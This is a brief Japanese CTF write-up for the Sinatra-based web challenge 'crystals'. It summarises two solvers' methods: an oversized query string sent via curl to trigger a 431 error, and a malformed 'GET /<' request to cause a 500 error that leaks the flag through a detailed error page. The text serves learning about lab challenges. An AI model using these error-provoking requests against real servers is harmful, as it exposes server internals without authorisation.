# crystals

## シナリオ

- SinatraというRubyのWebフレームワークを使用している
- いろいろエラーを出力させようとするとflagが出力される可能性がある

## Writeup

### はまやんはまやんニキ

作戦: **詳細なエラーページを出力させるために431エラー(Request Header Fileds Too Large)を引き起こす**

```bash
curl http://<hostname>/?$(python3 -c "print('A'*4000)")
```

を実行することで431エラーを起こしてflagを取得する

### 脆弱エンジニアの一員ニキ

作戦: **500番台のエラーを起こしてサーバの詳細を取得する**

```
GET /< HTTP/1.1
Host: <hostname>
```

でリクエストしたらエラーがでてflag出力

## メモ

Writeupを出してる人のやり方が様々であったが、どの方々も使っているフレームワークを見てそのドキュメントや情報を探っていた。今回でいうとSinatra。エラーを引き起こして詳細を出力させるという方法はどのフレームワークでも可能性がありそう。

## 参考

- https://blog.hamayanhamayan.com/entry/2024/07/22/145709#web-crystals
- https://zenn.dev/tchen/articles/aa14ad449cb991#%E2%9C%85crystal-(100pts-%E3%82%AF%E3%83%AA%E3%82%A2%E7%8E%8710%25)